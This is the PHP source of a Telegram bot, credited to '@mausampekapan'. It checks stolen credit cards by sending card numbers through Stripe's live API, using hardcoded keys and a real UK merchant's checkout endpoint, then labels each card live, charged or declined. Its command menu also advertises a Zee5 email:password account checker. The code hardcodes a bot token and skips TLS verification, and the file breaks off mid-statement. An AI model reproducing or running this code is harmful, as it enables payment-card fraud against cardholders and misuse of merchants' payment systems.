<?php

#----------------- [BOT RAW BY AAMIR] --------------------------#

#------------------[ Version 1.0 ] ------------------------#

$botToken = "1926644733:AAE9lZnZ9U7jHHNsOIn6Ysr6gtMSIHLo6Qc"; # ENTER HERE BOT TOKEN
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
#--------------------[Private Command]---------------------# IF YOU NOT WANT THAT COMMAND THEN REMOVE
# Id Status By Aamir
function checkId($userId){
    $mainids = array("1569782682,1569782682"); #PUT HERE Premium USERID
    if($userId == "1569782681"){#Add Here Your Id if ur owner
        $show = "Owner";
        }
        elseif(in_array($userId, $mainids) === true){
        $show = "Premium";
        }
        else{
        $show = "Free";
        }
        return $show;
}
$myid = checkId($userId); #Use $myid where u want
#------------------[Start]-------------#
if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<i>Hello $firstname now you can use /cmds%0A%0ABot Made by @mausampekapan </i>");
}
#----------- [ COMMANDS ] --------#
elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<i>BIN: /bin 461046%0AINFO: /info Know Yourself%0ASK CHECK: /sk sk_xyz%0ASTRIPE GATE: /ass cc|mon|yy|cvv%0ASTRIPE CHARGE: /scg cc|mon|yy|cvv%0AZee5 Checker: /zee5 mail:pass%0A%0ABot Made by @mausampekapan </i>");
}
#------------[User Info]---------#
elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<i>YOUR ID: <code>$userId</code>%0AFirst Name: $firstname%0AUsername: @$username%0A%0ABot Made by @mausampekapan </i>");
}
#---------------[BIN CODE]------------------#
elseif ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

$ch = curl_init();
$bin = substr($message, 5);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);

sendMessage($chatId, '<i>Bin Data ✓</i>%0A%0A<i>Bank: '.$bank.' </i>%0A<i>Country:</i><i> '.$country.' '.$emoji.' </i>%0A<i>Brand: '.$brand.' </i>%0A<i>Bin: '.$binna.' </i>%0A<i>Type: '.$type.' </i>%0A<i>Currency: '.$currency.' </i>%0A<i>Checked By: @'.$username.' </i>%0A%0A<i>BOT MADE BY ™ツ•Reja </i><b>  @mausampekapan</b>');
}
curl_close($ch);


//=========[Bin Command-END]=========//
#---------------------------[ GATE 1 CHECKER ]-----------------------#

if ((strpos($message, "!ass") === 0)||(strpos($message, "/ass") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
#-----------------------[BIN INFO]--------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);
#----------------[ RANDOM INFO ]----------------#

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$firstname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lastname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];


//

# -------------------- [1 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Michael+Jordan&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e1b625da-57f3-4575-84f5-8e9c2713540d33fb4e&muid=35b5a1d7-3179-4953-a58d-ed098b0015c6056e5a&sid=c9fe76b8-fcb9-4a83-8ed1-39e0263508cb285d42&pasted_fields=number&payment_user_agent=stripe.js%2F5d4db8533%3B+stripe-js-v3%2F5d4db8533&time_on_page=58202&key=pk_live_lPmPdMUX1hytBwmf727PWTvf');



$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.headfirstbristol.co.uk/apps/frontend/ajax/checkout/customer_payment_method_attach.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.headfirstbristol.co.uk',
'method: POST',
'path: /apps/frontend/ajax/checkout/customer_payment_method_attach.php',
'scheme: https',
'accept: application/json, text/plain, */*',
//'X-Requested-With: XMLHttpRequest',
'accept-language: en-US,en;q=0.9',
'Cookie: _uetsid=684f0550367011ecad29add0d4a36c6d',
'content-type: application/x-www-form-urlencoded;application/json',
'origin: https://www.headfirstbristol.co.uk',
'referer: https://www.headfirstbristol.co.uk/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 10; CPH1823) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
'X-Requested-With: XMLHttpRequest',
));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'stripe_customer_id=cus_KTsbia1EyXdG7p&payment_method_id='.$id.'');
  $result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

#---------------------------------------------[ RESPONSES ]------------------------------------#
 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CVV MATCHED </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CVV MATCHED </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CCN LIVE - Insufficient Funds </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CCN MATCHED </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CCN MATCHED - Card Doesnt Support Purchase </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> Pickup Card 「Reported Stolen Or Lost」 </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Declined ❌</b>%0A<b>Responce:</b> <b> Declined : Do_Not_Honor </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Declined ❌</b>%0A<b>Responce:</b> <b> Incorrect Card Number </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Declined ❌</b>%0A<b>Responce:</b> <b> Expired Card </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Declined ❌</b>%0A<b>Responce:</b> <b> Declined : Generic_Decline </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Declined ❌</b>%0A<b>Responce:</b> <b> Declined : Generic_Decline </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Declined ❌</b>%0A<b>Responce:</b> <b> Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Declined ❌</b>%0A<b>Responce:</b> <b> Card Declined </b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}


#---------------------------[ GATE 1 CHECKER ]-----------------------#

if ((strpos($message, "!scg") === 0)||(strpos($message, "/scg") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
#-----------------------[BIN INFO]--------------#
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$cctwo.'');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);
#----------------[ RANDOM INFO ]----------------#

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$firstname = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$lastname = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];


//

////////////////////////////===[1ST CURL]
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3JpugZD7Q4hRZAln1lHkad9S/confirm');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_intents/pi_3JpugZD7Q4hRZAln1lHkad9S/confirm',
'scheme: https',
'accept: application/json',
'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'cookie: cookiehub=eyJhbnN3ZXJlZCI6dHJ1ZSwicHJlY29uc2VudCI6ZmFsc2UsInJldmlzaW9uIjoxLCJkbnQiOmZhbHNlLCJjb29raWVMYXdzIjp0cnVlLCJ0b2tlbiI6IjZWNWhoV0J2NUZNZzROMEgxVFM4ZHpPb3NNTU8xOGJYR3VQWlVnaG02cjJWYlJNR1hSTnc0Y1QxUmNtd3NKUDUiLCJ0aW1lc3RhbXAiOiIyMDIxLTEwLTI2VDEzOjQ1OjUwLjY5NloiLCJjYXRlZ29yaWVzIjpbeyJjaWQiOjEsImlkIjoibmVjZXNzYXJ5IiwidmFsdWUiOnRydWUsInByZWNvbnNlbnQiOmZhbHNlLCJmaXJlZCI6dHJ1ZX0seyJjaWQiOjIsImlkIjoicHJlZmVyZW5jZXMiLCJ2YWx1ZSI6dHJ1ZSwicHJlY29uc2VudCI6ZmFsc2UsImZpcmVkIjpmYWxzZX0seyJjaWQiOjMsImlkIjoiYW5hbHl0aWNzIiwidmFsdWUiOnRydWUsInByZWNvbnNlbnQiOmZhbHNlLCJmaXJlZCI6ZmFsc2V9LHsiY2lkIjo0LCJpZCI6Im1hcmtldGluZyIsInZhbHVlIjp0cnVlLCJwcmVjb25zZW50IjpmYWxzZSwiZmlyZWQiOmZhbHNlfV19',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
//'x-requested-with: XMLHttpRequest',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][email]=juliaw2542%40gmail.com&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=e1b625da-57f3-4575-84f5-8e9c2713540d33fb4e&payment_method_data[muid]=3ccfe8cc-0284-44f7-86f7-9d5f758995c4925902&payment_method_data[sid]=19943a00-29ef-4403-a32a-fe2d1dffe76e5c50ab&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F673cc8e85%3B+stripe-js-v3%2F673cc8e85&payment_method_data[time_on_page]=75913&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=true&spc_eligible=false&key=pk_live_2bGbjRFVzNhPifF74NVlEydY&client_secret=pi_3JpugZD7Q4hRZAln1lHkad9S_secret_7lIYNYiRFCSgH5htZDsobT6qY');


$result1 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
//echo "<b>Result 1: </b>$result1<hr>";
// this is for additional info - so result will look more good by adding the info of the bin

#---------------------------------------------[ RESPONSES ]------------------------------------#
 if ((strpos($result1, 'incorrect_zip')) || (strpos($result1, 'Your card zip code is incorrect.')) || (strpos($result1, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<b>Card:</b> <code>'.$lista.'</code>%0A<b>Status:</b> <b>Approved ✅</b>%0A<b>Response:</b> <b> CHARGED 1$</b>%0A<b>Bank:</b> '.$bank1.'%0A<b>Country:</b> '.$name1.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Gateway:</b> <b>Stripe</b>%0A<b>Checked By:</b> @'.$username.'<b>%0ATime Taken:</b> <b>'.$time.'s</b>%0A%0A<b>Bot Made by @mausampekapan </b>');
}
elseif ((strpos($result1, '"cvc_check":"pass"')) || (strpos($result1, "Thank You.")) || (strpos($result1, '"status": "succeeded"')) || (strpos($result1, "Thank You For Donation.")) || (strpos($result1, "Your payment has already been processed")) || (strpos($result1, "Success ")) || (strpos($result1, '"type":"one-time"')) || (strpos($result1, "/donations/thank_you?donation_number="))){
